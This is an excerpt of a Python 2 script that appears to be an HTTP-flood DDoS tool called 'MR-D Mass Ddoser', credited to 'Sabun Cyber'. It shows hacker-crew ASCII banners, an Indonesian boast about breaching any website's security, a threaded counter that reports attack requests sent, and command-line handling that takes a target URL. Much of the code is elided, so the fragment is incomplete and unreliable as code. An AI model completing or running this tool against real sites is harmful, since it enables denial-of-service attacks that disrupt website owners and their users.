...
def usage():
	print 'MR-D Mass Ddoser Team created by Sabun Cyber'
	print 'MISTER_D Hackers https://www.facebook.com/jbochin/'
  ...
  <--|     |     | $$__  $$| $$  | $$| $$  | $$| $$  | $$    |
     ...
     ------|     | $$  | $$|  $$$$$$/|  $$$$$$$|  $$$$$$$    |
           ...
           |___________________      _________ /$$  | $$_____|
            ___________________MISTER_D_________|  $$$$$$/_____
                                               \______/ 


                        -------- MISTER_D AND DDOSER DEFACER TEAM --------
...
def httpcall(url):
	...
	try:
			...
			set_flag(1)
 			...
 			print '                                                                    '
 			print '>>>>> IM MISTER_D TIDAK ADA YANG TIDAK MUNGKIN BAGI SAYA UNTUK MENEMBUS KEMANAN WEBSITE ANDA :v :p <<<<<'
	...
	def run(self):
		...
		while flag==0:
			if (previous+150<request_counter) & (previous<>request_counter):
				print "#~~~>MR_D DDoS Attack's Sended: %d Sending more<~~~#" % (request_counter)
				previous=request_counter
		if flag==2:
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "Starting the M_D DDoS Tool"
		print "Created By Sabun_Cyber"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
